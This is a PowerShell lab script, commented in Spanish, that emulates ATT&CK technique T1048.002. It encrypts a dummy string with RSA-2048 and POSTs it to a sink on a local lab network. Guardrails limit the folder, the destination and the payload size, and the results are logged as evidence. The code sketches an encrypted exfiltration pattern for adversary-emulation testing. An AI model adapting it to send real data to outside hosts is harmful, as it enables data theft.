# ATA076 - T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (Windows)
# Manual (mismatch ART): la atomica T1048.002 (1cdf2fb0) usa curl -F a file.io (internet)
# y no RSA. Se implementa RSA-2048 OAEP + POST al sink local y descifrado local.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA076*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null
$sink = '192.168.65.1'
$port = 9090
if ($sink -notlike '192.168.65.*') { 'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii; exit 2 }
$plain = 'TFG-RSA-2026-B1.4 ' + ('C' * 100)
$bytes = [Text.Encoding]::UTF8.GetBytes($plain)
if ($bytes.Length -gt 190) { Write-Error 'GUARDARRAIL: payload RSA demasiado grande'; exit 2 }
$rsa = [Security.Cryptography.RSA]::Create(2048)
$cipher = $rsa.Encrypt($bytes, [Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
$b64 = [Convert]::ToBase64String($cipher)
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$url = "http://$sink`:$port/upload/ATA076"
$status = ''
try {
    $r = Invoke-WebRequest -Uri $url -Method POST -Body $b64 -ContentType 'application/octet-stream' -UseBasicParsing
    $status = "HTTP=$([int]$r.StatusCode)"
} catch {
    $status = "ERROR=$($_.Exception.Message)"
}
$dec = $rsa.Decrypt($cipher, [Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
$decText = [Text.Encoding]::UTF8.GetString($dec)
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$shaPost = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($b64))).Replace('-', '').ToLower()
@(
    "ata=ATA076", "tecnica=T1048.002", "fuente=manual",
    "t0=$t0", "t1=$t1", "url=$url", "bytes_cifrado=$($cipher.Length)",
    "sha256_post=$shaPost", "descifrado_ok=$($decText -eq $plain)", "resultado=$status"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
